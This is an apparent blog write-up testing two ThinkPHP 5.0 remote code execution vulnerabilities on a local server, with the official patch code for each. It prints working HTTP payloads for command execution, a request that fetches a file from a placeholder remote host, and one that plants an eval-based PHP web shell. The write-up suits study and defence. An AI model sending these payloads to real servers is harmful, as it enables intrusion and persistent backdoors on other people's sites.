# ThinkPHP5.0 Vulnerability Testing

> Since ThinkPHP released the vulnerability patch, the server has been scanned countless times for vulnerabilities to capture zombies.
> Even though the official patch has been released, I still want to test the TP vulnerability and test two vulnerabilities.

## 1. Vulnerability for Execution in All Versions

```xml
<!-- GET -->
http://127.0.0.1/ThinkPHP/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```
Due to the lack of explicit detection of the controller name and in the absence of enabling forced routing, phpinfo() can be executed directly. If the server does not restrict the execution of functions such as shell, shell escalation can be executed directly.

![](screenshots/2023-04-14-20-50-36.png)

For a detailed process of the vulnerability execution, refer to [Vulnerability Execution Process](https://www.cnblogs.com/st404/p/10245844.html)

##### Official Patch
Add regular expressions to limit the controller name
```php
/* /thinkphp/library/think/App.php line 555 add */
if (!preg_match('/^[A-Za-z](\w)*$/', $controller)) {
     throw new HttpException(404, 'controller not exists:' . $controller);
}
```

## 2. _method Vulnerability

```xml
<!-- POST -->
http://127.0.0.1/ThinkPHP/index.php?s=captcha
<!-- Headers -->
Content-Type:application/x-www-form-urlencoded
<!-- Body -->
_method=__construct&filter[]=system&method=GET&get[]=dir
```
_Trigger condition_

```php
//Config.php
'var_method'             => '_method'
```

Use the `$_POST['_method']` variable to pass the actual request method. When `$_POST['_method']=__construct`, the method of the Request class will override the class variables using the filter variable and execute any command when internal parameter filtering is performed.

![](screenshots/2023-04-14-20-50-45.png)

This can directly upload a PHP file test.php
```xml
<!-- POST -->
http://127.0.0.1/ThinkPHP/index.php?s=captcha&fileDown=copy("http://xxx/1.txt","test.php")
<!-- Headers -->
Content-Type:application/x-www-form-urlencoded
<!-- Body -->
_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=fileDown
```
Generate a web shell
```xml
<!-- POST -->
http://127.0.0.1/ThinkPHP/index.php?s=captcha&T=echo+^<?php+phpinfo();eval($_POST[cmd]);?^>+>>info.php
<!-- Headers -->
Content-Type:application/x-www-form-urlencoded
<!-- Body -->
_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=123
```

In config.php, the _method can be set as the other characters, or upgrade TP

##### Official Patch
The official patch limits the suspicious request methods set by _method and unsets it after processing _method, preventing the further use of __construct for variable overrides

```php
/* thinkphp/library/think/Request.php */
public function method($method = false)
{
    if (true === $method) {
        // Get the original request type
        return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
    } elseif (!$this->method) {
        if (isset($_POST[Config::get('var_method')])) {
            $method = strtoupper($_POST[Config::get('var_method')]);
            if (in_array($method, ['GET', 'POST', 'DELETE', 'PUT', 'PATCH'])) {
                $this->method = $method;
                $this->{$this->method}($_POST);
            } else {
                $this->method = 'POST';
            }
            unset($_POST[Config::get('var_method')]); //unset
        } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
            $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
        } else {
            $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
        }
    }
    return $this->method;
}
```

> References:
> https://www.cnblogs.com/st404/p/10245844.html
> https://mrxn.net/Infiltration/618.html
> https://www.cnblogs.com/nul1/p/11863574.html
> https://www.vulnbug.com/amp/thkphp5x-code-execution-vulnerabilities-and-bypass.html
> https://www.freebuf.com/vuls/194127.html